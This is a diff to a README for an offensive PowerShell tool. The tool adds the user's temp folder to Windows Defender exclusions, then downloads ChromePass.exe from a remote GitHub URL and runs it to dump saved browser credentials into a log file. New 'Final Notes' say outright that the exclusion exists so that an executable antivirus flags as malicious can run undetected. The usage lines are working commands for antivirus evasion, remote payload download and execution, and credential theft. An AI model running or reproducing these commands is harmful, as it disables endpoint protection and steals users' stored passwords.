@@ -73,10 +73,21 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-byp
 #Get Exclusions List
 .\Invoke-Exclusions.ps1 -action "query"
 
-## Add WD exclusion (To execute ChromePass.exe) + download URI (ChromePass.exe)  + execute (ChromePass.exe)
+## Add WD exclusion (To execute ChromePass.exe) + download (ChromePass.exe)  + execute (ChromePass.exe)
 # exclusion cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
 .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
 
 #Remove ExclusionPath "$Env:TMP" from Windows Defender list
 .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionPath" -Exclude "$Env:TMP"
+```
+
+<br />
+
+## Final Notes
+```
+ChromePass.exe standalone executable its flagged by AV as malicious, thats why we are executing Invoke-Exclusions cmdlet.
+The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download\Execute ChromePass.exe from that location.
+
+Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (ChromePass.exe).
+Warning: Invoke-Exclusions will 'NOT' delete itself or ChromePass.exe (deliver by -Uri parameter) at the end of exec.
 ```
